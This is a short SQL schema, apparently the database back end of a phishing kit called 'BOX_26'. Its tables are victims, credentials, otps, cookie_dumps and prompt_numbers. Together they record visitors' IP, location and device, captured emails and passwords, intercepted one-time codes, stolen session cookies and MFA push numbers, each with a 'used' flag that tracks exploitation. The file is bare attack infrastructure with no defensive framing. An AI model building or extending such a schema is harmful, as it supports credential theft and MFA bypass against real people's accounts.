-- BOX_26 Database Schema
-- Domain-Agnostic

CREATE TABLE IF NOT EXISTS victims (
    id TEXT PRIMARY KEY,
    first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    ip TEXT,
    country TEXT,
    city TEXT,
    user_agent TEXT,
    device_type TEXT,
    browser TEXT,
    os TEXT,
    visit_count INTEGER DEFAULT 1
);

CREATE TABLE IF NOT EXISTS credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    provider TEXT,
    email TEXT,
    password TEXT,
    attempt INTEGER DEFAULT 1,
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    used BOOLEAN DEFAULT 0
);

CREATE TABLE IF NOT EXISTS otps (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    provider TEXT,
    email TEXT,
    otp TEXT,
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    used BOOLEAN DEFAULT 0
);

CREATE TABLE IF NOT EXISTS cookie_dumps (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    url TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    cookie_count INTEGER,
    local_count INTEGER,
    session_count INTEGER,
    filename TEXT,
    processed BOOLEAN DEFAULT 0
);

CREATE TABLE IF NOT EXISTS prompt_numbers (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    number TEXT,
    status TEXT DEFAULT 'waiting',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    delivered_at DATETIME,
    confirmed_at DATETIME
);

CREATE INDEX IF NOT EXISTS idx_prompt_victim ON prompt_numbers(victim_id);
CREATE INDEX IF NOT EXISTS idx_prompt_status ON prompt_numbers(status);
